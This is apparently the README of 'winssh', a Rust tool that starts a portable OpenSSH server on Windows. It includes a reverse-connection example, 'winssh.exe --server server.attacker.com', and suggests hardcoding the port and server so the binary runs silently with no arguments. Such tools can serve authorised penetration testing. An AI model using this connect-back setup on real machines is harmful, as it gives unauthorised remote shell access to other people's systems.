# winssh

Spawns a ssh server on windows. No installation required.
Based on https://github.com/PowerShell/Win32-OpenSSH/

## usage

When launched without arguments, `winssh.exe` default to start an OpenSSH server on port 127.0.0.1:8022.
You can specify a port using:
```
winssh.exe --port <port>
```

You can also specify a server to connect back to using:

```
winssh.exe --server server.attacker.com
```

Or you can modify the source to hardcode the default values for port and server resulting in a binary,
that will execute witout any commandline args.

On every build new keys will be generated. After starting the server you can use the "key" from the files directory.
The key `key-reverse` from the files directory is used to connect back to the remote server (if specified).

## compile

```
rustup target add x86_64-pc-windows-gnu
rustup toolchain install stable-x86_64-pc-windows-gnu
```

Windows:
```
cargo build --release --target x86_64-pc-windows-gnu
```

To reduce the filesize further, you can strip the binaries with `strip`.
